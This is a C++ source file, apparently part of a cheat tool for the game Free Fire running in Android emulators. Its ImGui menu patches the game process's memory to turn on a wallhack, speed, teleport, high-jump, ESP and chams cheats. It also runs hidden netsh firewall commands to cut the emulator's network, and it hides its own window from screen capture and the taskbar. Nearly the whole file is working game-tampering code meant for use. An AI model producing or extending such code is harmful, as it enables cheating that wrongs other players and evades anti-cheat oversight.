                                            BYTE buffer[] = { 0x00, 0x00, 0x00, 0xEA, 0x00, 0x00, 0x80, 0xBF, 0x85, 0x8A, 0x40, 0xEE, 0x87, 0x9A, 0x40, 0xEE
                                            };


                                            for (int i = 0; i < foundAddresses15.size(); i++) {
                                                WriteProcessMemory(CMemory::Initialize()->processHandle, (void*)foundAddresses15[i], buffer, sizeof(buffer), NULL);
                                            }
                                            messger = "WALLHACK ACTIVADO";


                                            Beep(800, 700);



                                        }
                                        else
                                        {
                                            // Encender





                                        }
                                    }
                                    else {
                                        bottons_darkon::cf = false;
                                        if (bottons_darkon::cf2) {
                                            bottons_darkon::cf2 = false;

                                            statusButtonPressed15 = true;
                                            BYTE buffer[] = { 0x00, 0x00, 0x00, 0xEA, 0xBD, 0x37, 0x86, 0x35, 0x85, 0x8A, 0x23, 0xEE, 0x87, 0x9A, 0x22, 0xEE





                                            };
                                            for (int i = 0; i < foundAddresses15.size(); i++) {
                                                WriteProcessMemory(CMemory::Initialize()->processHandle, (void*)foundAddresses15[i], buffer, sizeof(buffer), NULL);
                                            }

                                            messger = "WALLHACK DESACTIVADO";
                                            Beep(400, 700);


                                            //  std::thread(MemoryScanWall).detach();

                                        }
                                    }

                                }

                                const char* velos[10]{ "N/A", "1", "2", "3","F1", "F2", "F3", "F4", "Q",  "E" };
                                ImGui::Combo("SPEED x99", &velosrapido, velos, IM_ARRAYSIZE(velos), 10);




                                {
                                    if (bottons_dark::vc)
                                    {
                                        if (!bottons_darkon::vc) {
                                            bottons_darkon::vc = true;
                                            bottons_darkon::vc2 = true;

                                            // Apagar
                                            statusButtonPressed11 = false;







                                            BYTE buffer[] = { 0x00, 0x00, 0x52, 0x42, 0x33,  0x33, 0xB3, 0x3F, 0x33, 0x33, 0xF3, 0x3F,
                                            };



                                            for (int i = 0; i < foundAddresses11.size(); i++) {
                                                WriteProcessMemory(CMemory::Initialize()->processHandle, (void*)foundAddresses11[i], buffer, sizeof(buffer), NULL);
                                            }
                                            messger = "SPEED x99 ACTIVADO";


                                            Beep(800, 700);



                                        }
                                        else
                                        {
                                            // Encender





                                        }
                                    }
                                    else {
                                        bottons_darkon::vc = false;
                                        if (bottons_darkon::vc2) {
                                            bottons_darkon::vc2 = false;

                                            statusButtonPressed11 = true;

                                            BYTE buffer[] = { 0x00, 0x00, 0x50, 0x40, 0x33,  0x33, 0xB3, 0x3F, 0x33, 0x33, 0xF3, 0x3F,
                                            };



                                            for (int i = 0; i < foundAddresses11.size(); i++) {
                                                WriteProcessMemory(CMemory::Initialize()->processHandle, (void*)foundAddresses11[i], buffer, sizeof(buffer), NULL);
                                            }

                                            messger = "SPEED x99 DESACTIVADO";
                                            Beep(400, 700);


                                            //  std::thread(MemoryScanWall).detach();

                                        }
                                    }

                                }




                                const char* cc[10]{ "N/A", "1", "2", "3","F1", "F2", "F3", "F4", "Q",  "E" };
                                ImGui::Combo("TELEPORT ", &teleporrafaxd, cc, IM_ARRAYSIZE(cc), 10);




                                {
                                    if (bottons_dark::nm)
                                    {
                                        if (!bottons_darkon::nm) {
                                            bottons_darkon::nm = true;
                                            bottons_darkon::nm2 = true;

                                            // Apagar
                                            statusButtonPressed87 = false;







                                            BYTE buffer[] = { 0x00, 0x7A ,0xC4 ,0x99 ,0xA0, 0xFA ,0x04 ,0xF0 ,0x4F ,0x2D ,0xE9 ,0x1C, 0xB0 ,0x8D, 0xE2,
                                            };



                                            for (int i = 0; i < foundAddresses87.size(); i++) {
                                                WriteProcessMemory(CMemory::Initialize()->processHandle, (void*)foundAddresses87[i], buffer, sizeof(buffer), NULL);
                                            }
                                            messger = "TELEPORT ACTIVADO";


                                            Beep(800, 700);



                                        }
                                        else
                                        {
                                            // Encender





                                        }
                                    }
                                    else {
                                        bottons_darkon::nm = false;
                                        if (bottons_darkon::nm2) {
                                            bottons_darkon::nm2 = false;

                                            statusButtonPressed87 = true;

                                            BYTE buffer[] = { 0x00 , 0x00 , 0x7A , 0x44 , 0x44 , 0xA0 , 0xFA , 0x04 , 0xF0 , 0x4F , 0x2D , 0xE9 , 0x1C , 0xB0 , 0x8D , 0xE2,
                                            };



                                            for (int i = 0; i < foundAddresses87.size(); i++) {
                                                WriteProcessMemory(CMemory::Initialize()->processHandle, (void*)foundAddresses87[i], buffer, sizeof(buffer), NULL);
                                            }

                                            messger = "TELEPORT DESACTIVADO";
                                            Beep(400, 700);


                                            //  std::thread(MemoryScanWall).detach();

                                        }
                                    }

                                }




                                const char* saltoxd[10]{ "N/A", "1", "2", "3","F1", "F2", "F3", "F4", "Q",  "E" };
                                ImGui::Combo("SALTO ALTO", &saltoaltisimoxd, saltoxd, IM_ARRAYSIZE(saltoxd), 10);




                                {
                                    if (bottons_dark::st)
                                    {
                                        if (!bottons_darkon::st) {
                                            bottons_darkon::st = true;
                                            bottons_darkon::st2 = true;

                                            // Apagar
                                            statusButtonPressed55 = false;







                                            BYTE buffer[] = { 0x06, 0xd8, 0x01, 0x44, 0xe3, 0x1e, 0xff, 0x2f, 0xe1,


                                            };



                                            for (int i = 0; i < foundAddresses55.size(); i++) {
                                                WriteProcessMemory(CMemory::Initialize()->processHandle, (void*)foundAddresses55[i], buffer, sizeof(buffer), NULL);
                                            }
                                            messger = "SALTO  xx  ACTIVADO";


                                            Beep(800, 700);



                                        }
                                        else
                                        {
                                            // Encender





                                        }
                                    }
                                    else {
                                        bottons_darkon::st = false;
                                        if (bottons_darkon::st2) {
                                            bottons_darkon::st2 = false;

                                            statusButtonPressed55 = true;

                                            BYTE buffer[] = { 0x06, 0x30, 0x48, 0x2d, 0xe9, 0x08, 0xb0, 0x8d, 0xe2, 0x00, 0x40, 0xa0, 0xe1, 0x38, 0x01, 0x9f, 0xe5,

                                            };



                                            for (int i = 0; i < foundAddresses55.size(); i++) {
                                                WriteProcessMemory(CMemory::Initialize()->processHandle, (void*)foundAddresses55[i], buffer, sizeof(buffer), NULL);
                                            }

                                            messger = "SALTO xx DESACTIVADO";
                                            Beep(400, 700);


                                            //  std::thread(MemoryScanWall).detach();

                                        }
                                    }

                                }

                            
                            
                            
                            }
                            ImGui::EndChild();
                        }
                        ImGui::EndGroup();
                    }
                    ///////
                    if (tabs == 2)
                    {
                        ImGui::SetCursorPos(ImVec2(60 + tab_size, 60) + (s->ItemSpacing * 2));
                        ImGui::BeginGroup();
                        {
                            ImGui::BeginChild("D", "Antenas ESP", ImVec2((c::bg::size.x - 60 - s->ItemSpacing.x * 4) / 2, 190));
                            {

                                if (ImGui::Checkbox("NPC NAME - login", &checkbox1[1]))
                                {
                                    if (checkbox1[1] == 1)
                                    {

                                        std::thread(NPC).detach();

                                    }

                                }
                                if (ImGui::Checkbox("ANTENA HOMBRO", &_hombrosxd))
                                {
                                    if (_hombrosxd == 1)
                                    {

                                        std::thread(hombro).detach();
                                    }

                                }



                                ImGui::Checkbox("ANTENA CABEZA", &Dcheckbox);

                            }
                            ImGui::EndChild();
                            ImGui::BeginChild("D", "CHAMS MENU", ImVec2((c::bg::size.x - 60 - s->ItemSpacing.x * 4) / 2, 210));
                            {
                              




                                if (ImGui::Checkbox("CHAMS BLANCAS ", &checkbox2[2]))
                                {
                                    if (checkbox2[2])
                                    {
                                       chamsyyyy();

                                    }
                                }




                                if (ImGui::Checkbox("CHAMS RGB", &_chamsrgb))
                                {
                                    if (_chamsrgb == 1)
                                    {
                                        rgbrafaxd();
                                       
                                    }

                                }




                                if (ImGui::Checkbox("CHAMS 3D ", &checkbox3[3]))
                                {
                                    if (checkbox3[3])
                                    {



                                        reddddxxdfdsa();

                                    }
                                }





                                if (ImGui::Checkbox("CHAMS RED ", &checkbox4[4]))
                                {
                                    if (checkbox4[4])
                                    {

                                      redchamsxd();
                                    }
                                }






                                
                                if (ImGui::Checkbox("CHAMS BOX ", &checkbox5[5]))
                                {
                                    if (checkbox5[5])
                                    {
                                        ESPbox();
                                    }
                                }




                            }
                            ImGui::EndChild();

                        }
                      
                     
                        ImGui::EndGroup();
                    }
                    ///////
                    if (tabs == 1)
                    {
                        ImGui::SetCursorPos(ImVec2(60 + tab_size, 60) + (s->ItemSpacing * 2));
                        ImGui::BeginGroup();
                        {
                            ImGui::BeginChild("D", "Settings", ImVec2((c::bg::size.x - 60 - s->ItemSpacing.x * 4) / 2, 190));
                            {
                                Trinage_background();

                                xd2 = ImGui::Checkbox("Stream Mode", &rafa::xd2);
                                
                                
                                ImGui::ColorEdit4("Panel Color", (float*)&c::accent_color, ImGuiColorEditFlags_NoSidePreview | ImGuiColorEditFlags_PickerHueBar | ImGuiColorEditFlags_NoOptions | ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoAlpha);
                                ImGui::ColorEdit4("Particles Color", (float*)&c::particle_color, ImGuiColorEditFlags_NoSidePreview | ImGuiColorEditFlags_PickerHueBar | ImGuiColorEditFlags_NoOptions | ImGuiColorEditFlags_NoInputs | ImGuiColorEditFlags_NoAlpha);


                            }
                            ImGui::EndChild();
                            ImGui::BeginChild("D", "Tutoriales | Download", ImVec2((c::bg::size.x - 60 - s->ItemSpacing.x * 4) / 2, 255));
                            {
                                if (ImGui::Button("Tutorial Activation", ImVec2(290, 35)))
                                {


                                    ShellExecute(NULL, "open", "https://www.youtube.com/@epicenginecoropration", NULL, NULL, SW_SHOWNORMAL);


                                }

                                if (ImGui::Button("Download Links", ImVec2(290, 35)))
                                {


                                    ShellExecute(NULL, "open", "https://discord.gg/EWCe7EN9PM", NULL, NULL, SW_SHOWNORMAL);


                                }


                                if (ImGui::Button("Download Emulator", ImVec2(290, 35)))
                                {


                                    ShellExecute(NULL, "open", "https://discord.gg/EWCe7EN9PM", NULL, NULL, SW_SHOWNORMAL);


                                }

                                if (ImGui::Button("Download Free Fire", ImVec2(290, 35)))
                                {


                                    ShellExecute(NULL, "open", "https://discord.gg/EWCe7EN9PM", NULL, NULL, SW_SHOWNORMAL);


                                }








                            }
                            ImGui::EndChild();

                        }
                        ImGui::EndGroup();
                        ImGui::SameLine();

                        ImGui::BeginGroup();
                        {
                            

                            ImGui::BeginChild("C", "Social Links", ImVec2((c::bg::size.x - 60 - s->ItemSpacing.x * 4) / 2, 150));
                            {
                                Trinage_background();
                             
                                if (ImGui::Button("Youtube", ImVec2(290, 35)))
                                {
                                   
                                    
                                        ShellExecute(NULL, "open", "", NULL, NULL, SW_SHOWNORMAL);

                                    
                                }
                                
                                if (ImGui::Button("Discord", ImVec2(290, 35)))
                                {

                                   
                                    ShellExecute(NULL, "open", "", NULL, NULL, SW_SHOWNORMAL);

                                   
                                }


                                





                            }
                            ImGui::EndChild();
                        }
                        ImGui::EndGroup();
                    }
                    /////


                    if (internet) {
                        if (rafa::internet) {
                            WinExec("netsh advfirewall firewall add rule name=\"FF Block In1\" dir=in action=block program=\"%ProgramFiles%\\BlueStacks_nxt\\HD-Player.exe\"", SW_HIDE); //Bluestacks 5
                            WinExec("netsh advfirewall firewall add rule name=\"FF Block In1\" dir=out action=block program=\"%ProgramFiles%\\Bluestacks_nxt\\HD-Player.exe\"", SW_HIDE); //Bluestacks 5

                            WinExec("netsh advfirewall firewall add rule name=\"FF Block In2\" dir=in action=block program=\"%ProgramFiles%\\BlueStacks\\HD-Player.exe\"", SW_HIDE); //Bluestacks 4
                            WinExec("netsh advfirewall firewall add rule name=\"FF Block In2\" dir=out action=block program=\"%ProgramFiles%\\Bluestacks\\HD-Player.exe\"", SW_HIDE); //Bluestacks 4

                            WinExec("netsh advfirewall firewall add rule name=\"FF Block In3\" dir=in action=block program=\"%ProgramFiles%\\BlueStacks_msi2\\HD-Player.exe\"", SW_HIDE); //Msi 4
                            WinExec("netsh advfirewall firewall add rule name=\"FF Block In3\" dir=out action=block program=\"%ProgramFiles%\\Bluestacks_msi2\\HD-Player.exe\"", SW_HIDE);; //Msi 4

                            WinExec("netsh advfirewall firewall add rule name=\"FF Block In6\" dir=in action=block program=\"%ProgramFiles%\\BlueStacks_msi5\\HD-Player.exe\"", SW_HIDE); //Msi 5 xxx
                            WinExec("netsh advfirewall firewall add rule name=\"FF Block In6\" dir=out action=block program=\"%ProgramFiles%\\BlueStacks_msi5\\HD-Player.exe\"", SW_HIDE);; //Msi 5 xxx

                            WinExec("netsh advfirewall firewall add rule name=\"FF Block In4\" dir=in action=block program=\"%ProgramData%\\BlueStacks_msi5\\HD-Player.exe\"", SW_HIDE); //Msi 5
                            WinExec("netsh advfirewall firewall add rule name=\"FF Block In4\" dir=out action=block program=\"%ProgramData%\\Bluestacks_msi5\\HD-Player.exe\"", SW_HIDE); //Msi 5

                            WinExec("netsh advfirewall firewall add rule name=\"FF Block In5\" dir=in action=block program=\"%ProgramFiles(x86)%\\SmartGaGa\\ProjectTitan\\Engine\\ProjectTitan.exe\"", SW_HIDE); //Smart Gaga
                            WinExec("netsh advfirewall firewall add rule name=\"FF Block In5\" dir=out action=block program=\"%ProgramFiles(x86)%\\SmartGaGa\\ProjectTitan\\Engine\\ProjectTitan.exe\"", SW_HIDE); //Smart Gaga



                            messger = "Desactivado Internet!";

                        }
                        else {

                            WinExec("netsh advfirewall firewall delete rule name=all program=\"%ProgramFiles%\\BlueStacks_nxt\\HD-Player.exe\"", SW_HIDE); //Bluestacks 5
                            WinExec("netsh advfirewall firewall delete rule name=all program=\"%ProgramFiles%\\BlueStacks\\HD-Player.exe\"", SW_HIDE); //Bluestacks 4
                            WinExec("netsh advfirewall firewall delete rule name=all program=\"%ProgramFiles%\\BlueStacks_msi2\\HD-Player.exe\"", SW_HIDE); //Msi 4
                            WinExec("netsh advfirewall firewall delete rule name=all program=\"%ProgramFiles%\\BlueStacks_msi5\\HD-Player.exe\"", SW_HIDE); //Msi 5 xxx
                            WinExec("netsh advfirewall firewall delete rule name=all program=\"%ProgramData%\\BlueStacks_msi5\\HD-Player.exe\"", SW_HIDE); //Msi 5
                            WinExec("netsh advfirewall firewall delete rule name=all program=\"%ProgramFiles(x86)%\\SmartGaGa\\ProjectTitan\\Engine\\ProjectTitan.exe\"", SW_HIDE); //Smart Gag

                            messger = "Activado Internet!";
                        }
                    }


                
                    
                    
                    
                    
                    Memory memory;
                    
                    
                    if (xd) {
                        if (rafa::xd) {
                            memory.ReWrite(
                                0x0000000000000000, 0x00007fffffffffff,
                                new BYTE[]{ 0x00, 0x48, 0x2D, 0xE9, 0x0D, 0xB0, 0xA0, 0xE1, 0x18, 0xD0, 0x4D, 0xE2, 0x04, 0x00, 0x0B, 0xE5, 0x08, 0x10, 0x0B, 0xE5, 0x0C, 0x20, 0x8D, 0xE5, 0x04, 0x00, 0x1B, 0xE5, 0x08, 0x10, 0x1B, 0xE5, 0x08, 0x00, 0x8D, 0xE5, 0x16, 0x00, 0x00, 0xEB, 0x08, 0x10, 0x1B, 0xE5, 0x28, 0x10, 0xD1, 0xE5, 0x01, 0x10, 0x01, 0xE2, 0x01, 0x00, 0x51, 0xE3 },
                                new BYTE[]{ 0x1E, 0xFF, 0x2F, 0xE1 }






                            );
                        }
                        else
                            memory.deWrite(
                                0x0000000000000000, 0x00007fffffffffff,
                                new BYTE[]{ 0x00, 0x00 },
                                new BYTE[]{ 0x00, 0x00 }
                        );
                    }
                    
                    
                    
                    
                    
                    if (xd) {
                        if (rafa::xd) {
                            memory.ReWrite(
                                0x0000000000000000, 0x00007fffffffffff,
                                new BYTE[]{ 0x00, 0x48, 0x2D, 0xE9, 0x0D, 0xB0, 0xA0, 0xE1, 0x70, 0xD0, 0x4D, 0xE2, 0xB0, 0x35, 0x9F, 0xE5, 0x03, 0x30, 0x9F, 0xE7, 0x00, 0x30, 0x93, 0xE5, 0x04, 0x30, 0x0B, 0xE5, 0x0C, 0x00, 0x0B, 0xE5, 0x10, 0x10, 0x0B, 0xE5, 0x14, 0x20, 0x0B, 0xE5, 0x0C, 0x00, 0x1B, 0xE5, 0x01, 0x10, 0x00, 0xE3 },
                                new BYTE[]{ 0x1E, 0xFF, 0x2F, 0xE1 }






                            );
                        }
                        else
                            memory.deWrite(
                                0x0000000000000000, 0x00007fffffffffff,
                                new BYTE[]{ 0x00, 0x00 },
                                new BYTE[]{ 0x00, 0x00 }
                        );
                    }



                    if (xd) {
                        if (rafa::xd) {
                            memory.ReWrite(
                                0x0000000000000000, 0x00007fffffffffff,
                                new BYTE[]{ 0x0A, 0x00, 0xA0, 0xE3, '?', '?', '?', '?', '?', '?', '?', '?', 0x03 },
                                new BYTE[]{ 0x00, 0xF0, 0x20, 0xE3 }






                            );
                        }
                        else
                            memory.deWrite(
                                0x0000000000000000, 0x00007fffffffffff,
                                new BYTE[]{ 0x00, 0x00 },
                                new BYTE[]{ 0x00, 0x00 }
                        );
                    }





                    if (xd) {
                        if (rafa::xd) {
                            memory.ReWrite(
                                0x0000000000000000, 0x00007fffffffffff,
                                new BYTE[]{ 0x49, 0x44, 0x48, 0x48, 0x42, 0x47, 0x42, 0x4E, 0x48, 0x4D, 0x44 },
                                new BYTE[]{ 0x50, 0x4B, 0x45, 0x4A, 0x42, 0x4C, 0x4E, 0x42, 0x41, 0x48, 0x48 }






                            );
                        }
                        else
                            memory.deWrite(
                                0x0000000000000000, 0x00007fffffffffff,
                                new BYTE[]{ 0x00, 0x00 },
                                new BYTE[]{ 0x00, 0x00 }
                        );
                    }




                    
                    
                    
                    
                    
                    
                    
                    //   
                     if (xd2)
                     {
                         if (rafa::xd2) {
                             SetWindowDisplayAffinity(GetActiveWindow(), WDA_EXCLUDEFROMCAPTURE);
                             ITaskbarList* pTaskList = NULL;
                             HRESULT initRet = CoInitialize(NULL);
                             HRESULT createRet = CoCreateInstance(CLSID_TaskbarList,
                                 NULL,
                                 CLSCTX_INPROC_SERVER,
                                 IID_ITaskbarList,
                                 (LPVOID*)&pTaskList);

                             if (createRet == S_OK)
                             {

                                 pTaskList->DeleteTab(GetActiveWindow());

                                 pTaskList->Release();
                             }

                             CoUninitialize();
                       
                            

                         }
                         else {
                             SetWindowDisplayAffinity(GetActiveWindow(), WDA_NONE);
                             ITaskbarList* pTaskList = NULL;
                             HRESULT initRet = CoInitialize(NULL);
                             HRESULT createRet = CoCreateInstance(CLSID_TaskbarList,
                                 NULL,
                                 CLSCTX_INPROC_SERVER,
                                 IID_ITaskbarList,
                                 (LPVOID*)&pTaskList);

                             if (createRet == S_OK)
                             {
                                 pTaskList->AddTab(GetActiveWindow());

                                 pTaskList->Release();
                             }

                             CoUninitialize();
                             
                         }
                     }



                    ImGui::PopStyleVar();
                    move_window();
                }
                ImGui::End();
            }


        }
        ImGui::Render();
        const float clear_color_with_alpha[4] = { 0 };
        g_pd3dDeviceContext->OMSetRenderTargets(1, &g_mainRenderTargetView, NULL);
        g_pd3dDeviceContext->ClearRenderTargetView(g_mainRenderTargetView, clear_color_with_alpha);
        ImGui_ImplDX11_RenderDrawData(ImGui::GetDrawData());

        g_pSwapChain->Present(1, 0);
    }

    ImGui_ImplDX11_Shutdown();
    ImGui_ImplWin32_Shutdown();
    ImGui::DestroyContext();

    CleanupDeviceD3D();
    ::DestroyWindow(hwnd);
    ::UnregisterClassW(wc.lpszClassName, wc.hInstance);

    return 0;
}


bool CreateDeviceD3D(HWND hWnd)
{
    // Setup swap chain
    DXGI_SWAP_CHAIN_DESC sd;
    ZeroMemory(&sd, sizeof(sd));
    sd.BufferCount = 2;
    sd.BufferDesc.Width = 0;
    sd.BufferDesc.Height = 0;
    sd.BufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;
    sd.BufferDesc.RefreshRate.Numerator = 60;
    sd.BufferDesc.RefreshRate.Denominator = 1;
    sd.Flags = DXGI_SWAP_CHAIN_FLAG_ALLOW_MODE_SWITCH;
    sd.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT;
    sd.OutputWindow = hWnd;
    sd.SampleDesc.Count = 1;
    sd.SampleDesc.Quality = 0;
    sd.Windowed = TRUE;
    sd.SwapEffect = DXGI_SWAP_EFFECT_DISCARD;

    UINT createDeviceFlags = 0;
    //createDeviceFlags |= D3D11_CREATE_DEVICE_DEBUG;
    D3D_FEATURE_LEVEL featureLevel;
    const D3D_FEATURE_LEVEL featureLevelArray[2] = { D3D_FEATURE_LEVEL_11_0, D3D_FEATURE_LEVEL_10_0, };
    HRESULT res = D3D11CreateDeviceAndSwapChain(NULL, D3D_DRIVER_TYPE_HARDWARE, NULL, createDeviceFlags, featureLevelArray, 2, D3D11_SDK_VERSION, &sd, &g_pSwapChain, &g_pd3dDevice, &featureLevel, &g_pd3dDeviceContext);
    if (res == DXGI_ERROR_UNSUPPORTED) // Try high-performance WARP software driver if hardware is not available.
        res = D3D11CreateDeviceAndSwapChain(NULL, D3D_DRIVER_TYPE_WARP, NULL, createDeviceFlags, featureLevelArray, 2, D3D11_SDK_VERSION, &sd, &g_pSwapChain, &g_pd3dDevice, &featureLevel, &g_pd3dDeviceContext);
    if (res != S_OK)
        return false;

    CreateRenderTarget();
    return true;
}

void CleanupDeviceD3D()
{
    CleanupRenderTarget();
    if (g_pSwapChain) { g_pSwapChain->Release(); g_pSwapChain = NULL; }
    if (g_pd3dDeviceContext) { g_pd3dDeviceContext->Release(); g_pd3dDeviceContext = NULL; }
    if (g_pd3dDevice) { g_pd3dDevice->Release(); g_pd3dDevice = NULL; }
}

void CreateRenderTarget()
{
    ID3D11Texture2D* pBackBuffer;
    g_pSwapChain->GetBuffer(0, IID_PPV_ARGS(&pBackBuffer));
    g_pd3dDevice->CreateRenderTargetView(pBackBuffer, NULL, &g_mainRenderTargetView);
    pBackBuffer->Release();
}

void CleanupRenderTarget()
{
    if (g_mainRenderTargetView) { g_mainRenderTargetView->Release(); g_mainRenderTargetView = NULL; }
}

extern IMGUI_IMPL_API LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);

LRESULT WINAPI WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    if (ImGui_ImplWin32_WndProcHandler(hWnd, msg, wParam, lParam))
        return true;

    switch (msg)
    {
    case WM_SIZE:
        if (g_pd3dDevice != NULL && wParam != SIZE_MINIMIZED)
        {
            CleanupRenderTarget();
            g_pSwapChain->ResizeBuffers(0, (UINT)LOWORD(lParam), (UINT)HIWORD(lParam), DXGI_FORMAT_UNKNOWN, 0);
            CreateRenderTarget();
        }
        return 0;
    case WM_SYSCOMMAND:
        if ((wParam & 0xfff0) == SC_KEYMENU) // Disable ALT application menu
            return 0;
        break;
    case WM_DESTROY:
        ::PostQuitMessage(0);
        return 0;
    }
    return ::DefWindowProc(hWnd, msg, wParam, lParam);
}

